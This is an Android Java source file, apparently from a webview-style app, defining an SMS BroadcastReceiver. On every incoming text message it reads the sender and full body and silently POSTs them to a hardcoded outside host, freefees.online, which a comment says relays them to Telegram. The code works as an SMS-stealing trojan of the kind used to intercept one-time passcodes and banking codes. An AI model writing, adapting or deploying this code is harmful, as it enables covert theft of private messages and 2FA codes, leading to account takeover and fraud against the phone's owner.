package com.webview.smsapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    // Your hosting API URL
    private static final String API_URL = "https://freefees.online/api/index.php";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null &&
                intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {

            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder fullMessage = new StringBuilder();
                    String sender = "";

                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu,
                                bundle.getString("format", "3gpp"));
                        sender = sms.getDisplayOriginatingAddress();
                        fullMessage.append(sms.getMessageBody());
                    }

                    String messageBody = fullMessage.toString();
                    Log.d(TAG, "SMS from: " + sender + " | Message: " + messageBody);

                    // Send SMS data to API (which forwards to Telegram)
                    sendToApi(sender, messageBody);
                }
            }
        }
    }

    private void sendToApi(final String sender, final String message) {
        new Thread(() -> {
            try {
                URL url = new URL(API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String postData = "sender=" + URLEncoder.encode(sender, "UTF-8") +
                        "&message=" + URLEncoder.encode(message, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "API Response Code: " + responseCode);

                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending to API: " + e.getMessage());
            }
        }).start();
    }
}